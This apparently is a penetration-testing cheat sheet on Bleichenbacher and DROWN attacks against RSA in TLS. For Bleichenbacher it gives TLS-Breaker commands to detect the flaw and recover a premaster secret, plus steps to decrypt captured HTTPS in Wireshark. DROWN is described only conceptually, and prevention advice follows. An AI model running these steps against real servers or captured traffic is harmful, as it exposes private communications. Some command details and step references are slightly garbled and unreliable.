There are 2 different types of attack that targets the RSA which is a asymmetrical algorithm.

# Bleichenbacher Attack
Targeting **RSA** encryption in combination with **PKCS#1 padding**, which is often combined with **RSA** encryption to ensure that the encryption is non-deterministic. 
This attack works by sending many adapted ciphertexts to the webserver. The web server decrypts these ciphertexts and checks the conformity of the PKCS#1 padding. 
If the webserver leaks whether the padding was valid or not, an attacker can deduce information about the original unmodified plaintext. 
By repeating these steps many times, an attacker eventually obtains enough information about the plaintext to fully reconstruct it.
### How to identify?
1) Use: https://github.com/tls-attacker/TLS-Breaker
```
java -jar apps/bleichenbacher-1.0.0.jar -pcap ./bleichenbacher.pcap
```
(if you get vulnerable then you can move forward)
### How to Exploit?
1)Find the encrypted PMS from Wireshark (hidden in Client Key exchange message handshake -> RSA Enc PMS -> PMS -> copy as hex-stream )
2) `java -jar apps/bleichenbacher-1.0.0.jar -conne ./bleichenbacher.pcap --encrypted_premaster_secret 'INFO_FROM_STEP1' -executeAttack`
(This will extract the PMS aka Padded preregistered secret)
3) `echo -n 'STRING_FROM_STEP3' | awk -F '0303' '{print "0303"$2}'`
(will remove the padding bytes and stops at TLS 1.2 or 0303 in hex, you can find the TLS version in Wireshark under first Hello Handshake)
4) Get the random key from Wireshark under **Client-hello**
5)Form the decryption key: `PMS_CLIENT_RANDOM <client_random> <premaster_secret>`
(the first random is under first hello, the second is either from step 4)
6) To decrypt HTTPs add in Wireshark the key from step 4: **Edit -> Preferences -> Protocols -> TLS** and specifying the path to the key file under **(Pre)-Master-Secret** log filename.


# Drown Attack
Is a particular version of **Bleichenbacher** attack that specifically targets the **SSL2.0**.
To successfully execute this attack, an attacker needs to intercept a large number of connections. 
Afterward, the attacker conducts a **Bleichenbacher** attack against an **SSL 2.0** server that uses specifically crafted handshake messages. 
In particular, **SSL 2.0** uses export encryption algorithms that are weak on purpose to comply with government regulations back in the 1990s. 
However, since the introduction of **SSL 2.0** hardware has improved significantly such that it is possible to break these weak encryption algorithms even without the vast resources of government agencies. 
Additionally, DROWN exploits bugs in old **OpenSSL** implementations that enable an attacker to break the encryption even faster.
### Prevention
DROWN can be prevented by disabling **SSL 2.0**. Most up-to-date operating systems today come with crypto libraries that do not support SSL 2.0 out-of-the-box, so finding web servers vulnerable to DROWN in the wild is very rare, though there might still be a few miss-configured and out-of-date servers out there. 
**Bleichenbacher** attacks can be prevented by not revealing padding information to the TLS client. 
Vulnerable web servers received patches, so keeping web servers up-to-date is sufficient to protect against a plain **Bleichenbacher** attack.